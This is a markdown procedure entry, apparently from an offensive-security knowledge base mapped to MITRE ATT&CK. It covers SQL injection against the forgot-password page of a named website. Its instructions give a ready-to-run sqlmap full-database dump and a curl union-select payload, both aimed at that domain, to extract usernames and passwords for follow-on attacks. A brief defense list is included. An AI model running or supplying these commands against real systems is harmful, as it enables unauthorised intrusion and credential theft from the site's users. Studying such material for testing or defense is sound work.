---
id: proc-uuid-002
name: Inject-SQL-Payload-to-Extract-Data
tags:
  - sqli
  - data-exfiltration
  - web
type: procedure
tools:
  - '[[tools/sqlmap]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/sqlmap-dump]]'
  - '[[commands/curl-union-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:20.508Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-SQL-Payload-to-Extract-Data

## Summary

This procedure exploits confirmed SQL injection points to dump sensitive database information, such as user credentials, from the forgot password endpoint, enabling further compromise in JSP applications.

## Description

Targeting unvalidated inputs in /forgot_password.jsp, this procedure uses union-based or error-based SQLi to query and retrieve data from tables like 'users'. In the context of gmmovinparts.com, it assumes a MySQL backend. Prerequisites: Confirmed vulnerability from prior testing. Outcomes include leaked data that can be used for authentication bypass.

## Requirements

1. Valid target URL with injectable parameter
2. sqlmap installed or manual payload crafting capability
3. Knowledge of database schema (inferred via enumeration)

## Defense

Defensive measures and detection strategies:

- Enforce least privilege on database accounts used by the web app
- Log and alert on high-volume queries or union select patterns
- Sanitize all user inputs with whitelisting

## Objectives

1. Enumerate database tables and columns
2. Extract sensitive data like usernames and passwords
3. Prepare data for use in subsequent attacks

## Instructions

### Step 1: Enumerate Database with sqlmap

**Context**: Automatically discover schema and dump tables to exfiltrate data.

**Command** ([[commands/sqlmap-dump]]):
```bash
sqlmap -u "https://gmmovinparts.com/forgot_password.jsp" --data="email=test@test.com" --dbms=mysql --dump --batch
```

> This runs a full dump. Expected output: CSV-like export of tables, e.g., users table with columns username, password.

### Step 2: Manual Union-Based Injection

**Context**: For targeted extraction, craft a union select to pull specific data.

**Command** ([[commands/curl-union-payload]]):
```bash
curl -X POST https://gmmovinparts.com/forgot_password.jsp -d "email=admin' UNION SELECT 1,username,password FROM users--" -v
```

> Response body includes concatenated query results, revealing admin credentials.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/sqlmap-dump]]
- [[commands/curl-union-payload]]

## Tools Used

- [[tools/sqlmap]]

## Tags

- [[sqli]]
- [[data-exfiltration]]
- [[web]]
